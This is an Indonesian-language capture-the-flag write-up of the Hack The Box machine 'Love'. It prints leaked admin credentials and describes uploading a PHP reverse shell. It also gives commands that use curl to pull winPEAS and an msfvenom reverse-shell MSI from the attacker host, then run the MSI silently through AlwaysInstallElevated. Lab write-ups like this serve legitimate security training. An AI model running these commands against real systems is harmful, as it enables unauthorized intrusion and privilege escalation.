# LOVE

hasil nmap ada domain staging.love.htb, tambahkan domain tersebtu ke /etc/hosts dan buka. Pada /demo kita coba melihat beberapa port yang tadi forbidden. kita buka 127.0.0.1:5000 dan dapat credential :

```
admin
@LoveIsInTheAir!!!! 
```

Dilanjutkan login ke 10.10.10.239/admin menggunakan credential tersebut. Dapat referensi dari sini https://github.com/ivan-sincek/php-reverse-shell/tree/master/src/minified . kita pake yang mini shell ganti ip dan port upload pada update profile dan mendapatkan shell. Dari sini flag user terdapat di C:\Users\Phoebe\Desktop> : 6f93ef7a872ff11fc9eb32fe12c6d7d1

lalu kita pake curl untuk mentransfer `curl http://10.10.16.29:8000/winPEASx64.exe -o winpeas.exe -s` kemudian kita jalankan winpeas.exe dengan mengetik winpeas.exe di cmd. 

```log
[+] Checking AlwaysInstallElevated
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated
    AlwaysInstallElevated set to 1 in HKLM!
    AlwaysInstallElevated set to 1 in HKCU!
```

riset mengenai always install elevated dan jalankan `msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.29 LPORT=4422 -f msi > elevated.msi` lalu download dari sisi server dgn command `curl http://10.10.16.29:8001/elevated.msi -o elev1.msi -s` kemudian eksekusi `msiexec /quiet /qn /i elev1.msi` di server dan kita sudah dapat reverse shell. 

Dapat flag root : 4e3dd3a324377d14ca91d6af9f950170